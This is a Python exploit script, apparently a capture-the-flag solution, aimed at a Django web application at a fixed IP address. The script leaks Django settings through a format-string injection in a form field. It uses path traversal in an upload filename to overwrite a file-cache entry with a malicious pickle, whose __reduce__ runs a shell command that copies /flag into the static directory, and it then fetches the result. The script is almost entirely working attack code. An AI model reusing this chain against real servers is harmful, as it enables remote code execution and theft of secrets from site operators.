# coding: utf-8
import hashlib

from django.conf import settings
from django.utils.translation import get_language
from django.utils.timezone import get_current_timezone_name
from django.utils.encoding import iri_to_uri
from requests.api import request

# 项目源码的 settings
import src.app.settings

settings.configure(src.app.settings)


def _i18n_cache_key_suffix(cache_key):
    """If necessary, add the current locale or time zone to the cache key."""
    if settings.USE_I18N or settings.USE_L10N:
        # first check if LocaleMiddleware or another middleware added
        # LANGUAGE_CODE to request, then fall back to the active language
        # which in turn can also fall back to settings.LANGUAGE_CODE
        # cache_key += '.%s' % getattr(request, 'LANGUAGE_CODE', get_language())
        cache_key += ".%s" % get_language()
    if settings.USE_TZ:
        cache_key += ".%s" % get_current_timezone_name()
    return cache_key


def _generate_cache_header_key(uri):
    # 默认是空
    key_prefix = ""
    """Return a cache key for the header cache."""
    url = hashlib.md5(iri_to_uri(uri).encode("ascii"))
    cache_key = "views.decorators.cache.cache_header.%s.%s" % (
        key_prefix,
        url.hexdigest(),
    )
    return _i18n_cache_key_suffix(cache_key)


def _generate_cache_key(uri, method):
    # 默认是空
    key_prefix = ""
    """Return a cache key for the header cache."""
    url = hashlib.md5(iri_to_uri(uri).encode("ascii"))
    cache_key = "views.decorators.cache.cache_page.%s.%s.%s.%s" % (
        key_prefix,
        method,
        url.hexdigest(),
        hashlib.md5().hexdigest(),
    )
    return _i18n_cache_key_suffix(cache_key)


def make_key(k):
    # 默认是 1
    version = 1
    return "%s:%s:%s" % ("", version, k)


# 注意路径 /index 和 /index/ 生成的是完全不同等
request_uri = "http://15.236.210.121:8000/index"

cache_header_key = make_key(_generate_cache_header_key(request_uri))
cache_header_file = "".join(
    [hashlib.md5(cache_header_key.encode()).hexdigest(), ".djcache"]
)
print(cache_header_file)

# method 对应 url 请求方法 GET POST等
cache_key = make_key(_generate_cache_key(request_uri, "GET"))
cache_file = "".join([hashlib.md5(cache_key.encode()).hexdigest(), ".djcache"])
print(cache_file)

import os
import re
import json
import requests
from io import BytesIO


def get_sensitive(d):
    files = {"file": ("1.jpg", BytesIO("\xFF\xD8".encode()))}
    res = requests.post("http://15.236.210.121:8000/generate", data=d, files=files)
    match = re.search(r"<h3>(.*?)</h3>", res.text)
    if not match:
        exit("[-] exploit failed")

    return match.group(1).replace("'", '"')


data = {
    "intro": "{user._groups.model._meta.default_apps.app_configs[auth].module.settings.CACHES}",
    "filename": "get_location.jpg",
}
sensitive = get_sensitive(data)
s_json = json.loads(sensitive)
cache_location = s_json["default"]["LOCATION"]

data = {
    "intro": "{user._groups.model._meta.default_apps.app_configs[auth].module.settings.BASE_DIR}",
    "filename": "get_base_dir.jpg",
}
base_dir = get_sensitive(data)

data = {
    "intro": "{user._groups.model._meta.default_apps.app_configs[auth].module.settings.STATIC_ROOT}",
    "filename": "get_static_root.jpg",
}
static_root = get_sensitive(data)

static_path = os.path.join(base_dir, static_root)
cache_path = os.path.join(base_dir, cache_location)
relative_path = os.path.relpath(cache_path, static_path)

import time
import zlib
import pickle


class RCE:
    def __reduce__(self):
        # return os.system, ("ls -alh / > " + static_path,)
        return exec, (
            "__import__('os').system('cat /flag > "
            + os.path.join(static_path, "11111meowmeowmeow.txt")
            + "')",
        )


expire = time.time() + 60  # timeout
payload = pickle.dumps(expire, pickle.HIGHEST_PROTOCOL)
payload += zlib.compress(pickle.dumps(RCE(), pickle.HIGHEST_PROTOCOL))


data = {
    "intro": "write",
    "filename": os.path.join(relative_path, cache_header_file),
}
files = {"file": ("1.jpg", BytesIO(payload))}
res = requests.post("http://15.236.210.121:8000/generate", data=data, files=files)
print(res.text)

res = requests.get(request_uri)
print(res.text)

res = requests.get("http://15.236.210.121:8000/static/11111meowmeowmeow.txt")

print(res.text)
